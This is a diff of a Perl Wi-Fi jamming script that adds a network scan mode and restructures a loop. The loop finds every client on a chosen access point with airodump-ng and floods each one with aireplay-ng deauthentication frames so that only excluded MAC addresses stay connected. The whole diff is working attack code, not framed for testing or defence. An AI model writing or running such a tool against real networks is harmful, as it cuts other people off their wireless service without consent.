@@ -42,62 +42,70 @@ my $result = GetOptions(
 	"deauth=s"     => \$deauth,
 	"direct"       => \$direct,
 	"help"         => \$help,
-	"scan"			=>\$scan,
+	"scan"         => \$scan,
 	"exclude=s{,}" => \@EXCLUDED_MAC,
 	"xterm"        => \$xterm,
 	"verbose"      => \$verbose
 );
 
 if (   !defined($dev)
-	|| (!defined($channel) && !defined($scan))
-	|| (!defined($target) && !defined($scan))
+	|| ( !defined($channel) && !defined($scan) )
+	|| ( !defined($target)  && !defined($scan) )
 	|| defined($help) )
 {
 	&usage();
 	exit();
 }
 
+if ( defined($scan) ) {
+	&message( "Initializing scan for the wireless networks in range..",
+		"Scan", 0 );
+	open( LIST, "/sbin/iwlist scan 2>&1 |" ) or die "Failed: $!\n";
 
-if(defined($scan)){
-	&message("Initializing scan for the wireless networks in range..","Scan",0);
-open(LIST, "/sbin/iwlist scan 2>&1 |") or die "Failed: $!\n";
+	my %wifis;
+	my $essid;
+	while (<LIST>) {
 
-my %wifis;
-my $essid;
-while (<LIST>) {
-
-        if (/ESSID\:\"(.*)\"/) { $essid = $1; }
-        elsif (/Quality=(\d*)\/70/) { $quality= $1; }
-        elsif (/Address:\s+(.*)/) { $address= $1; }
-        elsif (/Channel:(.*)/) { $channel= $1; }
-        elsif (/Encryption key\:(\S*)/) {  $key= $1; }
-        elsif (/IE\:/i){
-			if($essid ne ""){
-				$wifis{$essid}->{"quality"}=$quality;
-				$wifis{$essid}->{"address"}=$address;
-				$wifis{$essid}->{"key"}=$key;
-				$wifis{$essid}->{"channel"}=$channel;
+		if    (/ESSID\:\"(.*)\"/)       { $essid   = $1; }
+		elsif (/Quality=(\d*)\/70/)     { $quality = $1; }
+		elsif (/Address:\s+(.*)/)       { $address = $1; }
+		elsif (/Channel:(.*)/)          { $channel = $1; }
+		elsif (/Encryption key\:(\S*)/) { $key     = $1; }
+		elsif (/IE\:/i) {
+			if ( $essid ne "" ) {
+				$wifis{$essid}->{"quality"} = $quality;
+				$wifis{$essid}->{"address"} = $address;
+				$wifis{$essid}->{"key"}     = $key;
+				$wifis{$essid}->{"channel"} = $channel;
 			}
 		}
-}
+	}
 
-my $choise=0;
-my %list;
-	&message( "#\tEssid\t\tAddress\t\t\tChannel","Scan",1);
+	my $choise = 0;
+	my %list;
+	&message( "#\tEssid\t\tAddress\t\t\tChannel", "Scan", 1 );
 
-foreach $essid ( keys %wifis) {
-	$choise++;
-	$list{$choise}=$essid;
-	&message( $choise.") \t". $essid."\t".$wifis{$essid}->{"address"}."\t".$wifis{$essid}->{"channel"},"Scan",1);
-}
-&message("Your choise:","Scan",0);
-my $t=<STDIN>;
-chomp($t);
-&message("Your choise is: ".$list{$t}." ". $wifis{$list{$t}}->{"address"},"Scan",1);
-	$target=$wifis{$list{$t}}->{"address"};
-	$channel=$wifis{$list{$t}}->{"channel"};
-	
-	
+	foreach $essid ( keys %wifis ) {
+		$choise++;
+		$list{$choise} = $essid;
+		&message(
+			$choise . ") \t" 
+			  . $essid . "\t"
+			  . $wifis{$essid}->{"address"} . "\t"
+			  . $wifis{$essid}->{"channel"},
+			"Scan", 1
+		);
+	}
+	&message( "Your choise:", "Scan", 0 );
+	my $t = <STDIN>;
+	chomp($t);
+	&message(
+		"Your choise is: " . $list{$t} . " " . $wifis{ $list{$t} }->{"address"},
+		"Scan", 1
+	);
+	$target  = $wifis{ $list{$t} }->{"address"};
+	$channel = $wifis{ $list{$t} }->{"channel"};
+
 }
 $cicle  = 10 if !defined($cicle);
 $deauth = 10 if !defined($deauth);
@@ -112,6 +120,216 @@ $SIG{'INT'} = sub {
 	&message( "All clear, exiting", "Sighandler", 1 );
 	exit();
 };
+
+
+&message(
+	"Starting jamming on " 
+	  . $dev
+	  . " cycling every "
+	  . $cicle . " for "
+	  . $deauth
+	  . " deauths",
+	"Main", 0
+);
+&message( "Kicking out all clients...", "Main", 0 );
+
+if ( defined($verbose) ) {
+	&message( "Verbose mode on", "Main", 1 );
+	$verbose = 1;
+}
+else {
+	$verbose = 0;
+}
+if ( defined($direct) ) {
+	&message( "Direct Jamming on", "Main", 0 );
+	$direct = 1;
+}
+else {
+	$direct = 0;
+}
+if ( defined($xterm) ) {
+	&message( "Xterm mode on", "Main", 0 );
+	$xterm = 1;
+}
+else {
+	$xterm = 0;
+}
+$aireplay = threads->create( 'jamming', $target, $target, $dev, $deauth, 0, 0 );
+$aireplay->join();
+$airodump =
+  threads->create( 'airodump', $dev, $channel, $deauth, $xterm, $target );
+
+foreach my $excluded (@EXCLUDED_MAC) {
+	&message( $excluded, "Excluded", 1 );
+}
+`rm -rfv *.netxml`;
+
+while ( sleep $cicle ) {
+	@XML = <*.netxml>;
+	##Checking the Thread state....!
+	&message( "Checking states and joining the threads", "Threads", 0 );
+	my @joinable_threads = threads->list(threads::joinable);
+	my $joined           = scalar(@joinable_threads);
+	foreach my $joinable (@joinable_threads) {
+		my $tid=$joinable->tid();
+			&message( "#".$tid." joinable", "Threads", 0 );
+		if(defined ($threads{$tid})){
+					$joinable->join();
+		}
+
+		delete $threads{$tid };
+		&message( "#".$tid." joined", "Threads", 0 );
+		
+	}
+	&message( "joined " . $joined . " threads", "Threads", 0 );
+	my $found = 0;
+	foreach my $file (@XML) {
+		$tree->parse_file($file);
+		foreach my $NETWORK ( $tree->find_by_tag_name('wireless-network') ) {
+			if (    $NETWORK->find_by_tag_name('BSSID')->as_text eq $target
+				and $found == 0 )
+			{
+				$found = 1;
+				if ( $verbose == 1 ) {
+					system("clear");
+				}
+				my $clients = 0;
+				if ( defined $NETWORK->find_by_tag_name('wireless-client') ) {
+					foreach my $CLIENT (
+						$NETWORK->find_by_tag_name('wireless-client') )
+					{
+						$KILL =
+						  $CLIENT->find_by_tag_name('client-mac')->as_text;
+						my $is_excluded = 0;
+						foreach my $special (@EXCLUDED_MAC) {
+							if ( $special eq $KILL ) {
+								$is_excluded = 1;
+								&message( $KILL . " is on EXCLUDED_MAC list!",
+									"Excluded", 1 );
+
+							}
+						}
+						if ( $is_excluded == 0 ) {
+							my $exists = 0;
+							foreach my $value ( values %threads ) {
+								if ( $value eq $KILL ) {
+									$exists = 1;
+								}
+							}
+
+							if ( $exists == 0 ) {
+								$tr = threads->create(
+									'jamming', $KILL,   $target, $dev,
+									$deauth,   $direct, $verbose
+								);
+								&message( $tr->tid() . " on " . $KILL . " !",
+									"Threads", 1 );
+								$threads{ $tr->tid() } = $KILL;
+
+							}
+
+						}
+						$clients++;
+					}
+					my $threads_running = threads->list(threads::running);
+					&message(
+						$target . " has " . $clients . " clients associated!",
+						"Network", 1 );
+					&message( $threads_running . " threads running!",
+						"Threads", 1 );
+				}
+
+			}
+		}
+	}
+}
+
+sub airodump {
+	$dev         = $_[0];
+	$channel     = $_[1];
+	$deauth      = $_[2];
+	$xterm       = $_[3];
+	$target      = $_[4];
+
+	$SIG{'KILL'} = sub {
+		&message( "Signal kill received, exiting [WAS airodump-ng thread]",
+			"Threads", 0 );
+		threads->exit();
+	};
+
+
+	if ( $xterm == 1 ) {
+			
+		system("xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c $channel -w airodumpoutput $dev --output-format netxml -a'");
+		 	
+			  
+	}
+	else {
+	
+		 system("airodump-ng -a -c $channel -w airodumpoutput $dev -d $target --output-format netxml > /dev/null");	
+		 
+
+	}
+
+	threads->yield();
+
+}
+
+sub jamming {
+	my ( $KILL, $target, $dev, $deauth, $direct, $verbose ) = @_;
+	$SIG{'KILL'} = sub {
+		&message(
+			"Signal kill received, exiting [WAS attacking on " . $KILL . "]",
+			"Threads", 0 );
+		threads->exit();
+	};
+	
+
+	if ( $direct == 1 ) {
+		&message( $KILL . " with " . $deauth . " on " . $dev . " direct mode",
+			"Attacking", 0 );
+			if($verbose==1){
+				system( "aireplay-ng --deauth " 
+			  . $deauth . " -a " 
+			  . $target . " -c "
+			  . $KILL . " "
+			  . $dev
+			   );
+			} else {
+								system( "aireplay-ng --deauth " 
+			  . $deauth . " -a " 
+			  . $target . " -c "
+			  . $KILL . " "
+			  . $dev ." >/dev/null"
+			   );
+			}
+		
+	}
+	else {
+		&message( $KILL . " with " . $deauth . " on " . $dev, "Attacking", 0 );
+			  
+			  if($verbose==1){
+				system( "aireplay-ng --deauth " 
+			  . $deauth . " -a " 
+			  . $KILL . " "
+			  . $dev
+			   );
+			} else {
+				system( "aireplay-ng --deauth " 
+			  . $deauth . " -a " 
+			  . $KILL . " "
+			  . $dev ." > /dev/null"
+			   );
+			}
+	}
+	&message( "Finished on " . $KILL . " with " . $deauth . " on " . $dev,
+		"Attacking", 0 );
+
+#system("xterm -fn fixed -geom -0-0 -title 'Jamming ".$KILL."' -e 'aireplay-ng --deauth 30 -a ".$target." -c ".$KILL." ".$dev."'");
+#threads->exit();
+	threads->yield();
+}
+
 sub killthreads() {
 	my $tid     = $_[0];
 	my @running = threads->list(threads::all);
@@ -133,7 +351,7 @@ sub usage() {
 	access point only you and ony others specified MAC address will remain here.
 		
 	" . $0
-	  . " --dev [DEVICE] --target [TARGET] --channel [CHANNEL] --cycle [CYCLE] --deauth [DEAUTH] --exclude [MAC_1] [MAC_2] [...] --verbose --direct
+	  . " --dev [DEVICE] --scan --target [TARGET] --channel [CHANNEL] --cycle [CYCLE] --deauth [DEAUTH] --exclude [MAC_1] [MAC_2] [...] --verbose --direct
 	
 	Where:
 	[DEVICE] is your device addres (monitor mode on)
@@ -143,6 +361,8 @@ sub usage() {
 	[DEAUTH] is the deauth count of aireplay
 	[MAC_1] [MAC_2] [...] Mac addresses to exclude from the deauth process
 	option --direct it's using the direct client deauth on aireplay (-c option)
+	with option --scan " . $PROG
+	  . " will scan for wireless network in range and let you decide the target and the channel (--target and --channel not required)
 	
 	E.G. 
 	" . $0
@@ -151,7 +371,6 @@ sub usage() {
 	\n";
 
 }
-
 
 sub message() {
 
@@ -217,198 +436,3 @@ sub message() {
 	}
 
 }
-
-&message(
-	"Starting jamming on " 
-	  . $dev
-	  . " cycling every "
-	  . $cicle . " for "
-	  . $deauth
-	  . " deauths",
-	"Main", 0
-);
-&message( "Kicking out all clients...", "Main", 0 );
-
-if ( defined($verbose) ) {
-	&message( "Verbose mode on", "Main", 1 );
-	$verbose = 1;
-}
-else {
-	$verbose = 0;
-}
-if ( defined($direct) ) {
-	&message( "Direct Jamming on", "Main", 0 );
-	$direct = 1;
-}
-else {
-	$direct = 0;
-}
-if ( defined($xterm) ) {
-	&message( "Xterm mode on", "Main", 0 );
-	$xterm = 1;
-}
-else {
-	$xterm = 0;
-}
-$aireplay = threads->create( 'jamming', $target, $target, $dev, $deauth, 0, 0 );
-$aireplay->join();
-$airodump =
-  threads->create( 'airodump', $dev, $channel, $deauth, $xterm, $target );
-
-foreach my $excluded (@EXCLUDED_MAC) {
-	&message( $excluded, "Excluded", 1 );
-}
-`rm -rfv *.netxml`;
-
-
-
-while ( sleep $cicle ) {
-	@XML = <*.netxml>;
-	##Checking the Thread state....!
-	&message( "Checking states and joining the threads", "Threads", 0 );
-	my @joinable_threads = threads->list(threads::joinable);
-	my $joined           = 0;
-	foreach my $joinable (@joinable_threads) {
-		$joinable->join();
-		delete $threads{ $joinable->tid() };
-		$joined++;
-	}
-	&message( "joined " . $joined . " threads", "Threads", 0 );
-	my $found = 0;
-	foreach my $file (@XML) {
-		$tree->parse_file($file);
-		foreach my $NETWORK ( $tree->find_by_tag_name('wireless-network') ) {
-			if (    $NETWORK->find_by_tag_name('BSSID')->as_text eq $target
-				and $found == 0 )
-			{
-				$found = 1;
-				if ( $verbose == 1 ) {
-					system("clear");
-				}
-				my $clients = 0;
-				if ( defined $NETWORK->find_by_tag_name('wireless-client') ) {
-					foreach my $CLIENT (
-						$NETWORK->find_by_tag_name('wireless-client') )
-					{
-						$KILL =
-						  $CLIENT->find_by_tag_name('client-mac')->as_text;
-						my $is_excluded = 0;
-						foreach my $special (@EXCLUDED_MAC) {
-							if ( $special eq $KILL ) {
-								$is_excluded = 1;
-								&message( $KILL . " is on EXCLUDED_MAC list!",
-									"Excluded", 1 );
-
-							}
-						}
-						if ( $is_excluded == 0 ) {
-							my $exists = 0;
-							foreach my $value( values %threads) {
-								if ( $value eq $KILL ) {
-									$exists = 1;
-								}
-							}
-
-							if ( $exists == 0 ) {
-								$tr = threads->create(
-									'jamming', $KILL,   $target, $dev,
-									$deauth,   $direct, $verbose
-								);
-								&message( $tr->tid() . " on " . $KILL . " !",
-									"Threads", 1 );
-								$threads{ $tr->tid() } = $KILL;
-
-							}
-
-						}
-						$clients++;
-					}
-					my $threads_running = threads->list(threads::running);
-					&message(
-						$target . " has " . $clients . " clients associated!",
-						"Network", 1 );
-					&message( $threads_running . " threads running!",
-						"Threads", 1 );
-				}
-
-			}
-		}
-	}
-}
-
-sub airodump {
-	$dev         = $_[0];
-	$channel     = $_[1];
-	$deauth      = $_[2];
-	$xterm       = $_[3];
-	$target      = $_[4];
-	$SIG{'KILL'} = sub {
-		&message( "Signal kill received, exiting [WAS airodump-ng thread]",
-			"Threads", 0 );
-		threads->exit();
-	};
-	
-		my $silent=" > /dev/null 2>&1";
-	if ( $verbose == 1 ) {
-		$silent="";
-	}
-	if ( $xterm == 1 ) {
-		$silent=" > /dev/null 2>&1";
-		system(
-"xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c "
-			  . $channel
-			  . " -w airodumpoutput "
-			  . $dev
-			  . " --output-format netxml -a' ".$silent );
-	}
-	else {
-		system(
-"airodump-ng -a -c $channel -w airodumpoutput $dev -d $target --output-format netxml ".$silent
-		);
-
-	}
-
-	threads->yield();
-
-}
-
-sub jamming {
-	my ( $KILL, $target, $dev, $deauth, $direct, $verbose ) = @_;
-	$SIG{'KILL'} = sub {
-		&message(
-			"Signal kill received, exiting [WAS attacking on " . $KILL . "]",
-			"Threads", 0 );
-		threads->exit();
-	};
-	my $silent=" > /dev/null";
-	if ( $verbose == 1 ) {
-		$silent="";
-	}
-		
-		if ( $direct == 1 ) {
-			&message(
-				$KILL . " with " . $deauth . " on " . $dev . " direct mode",
-				"Attacking", 0 );
-			system( "aireplay-ng --deauth " 
-				  . $deauth . " -a " 
-				  . $target . " -c "
-				  . $KILL . " "
-				  . $dev .$silent  );
-		}	else {
-			&message( $KILL . " with " . $deauth . " on " . $dev,
-				"Attacking", 0 );
-			system( "aireplay-ng --deauth " 
-				  . $deauth . " -a " 
-				  . $KILL . " "
-				  . $dev .$silent );
-		}
-		&message( "Finished on " . $KILL . " with " . $deauth . " on " . $dev,
-			"Attacking", 0 );
-
-
-
-#system("xterm -fn fixed -geom -0-0 -title 'Jamming ".$KILL."' -e 'aireplay-ng --deauth 30 -a ".$target." -c ".$KILL." ".$dev."'");
-#threads->exit();
-	threads->yield();
-}
-
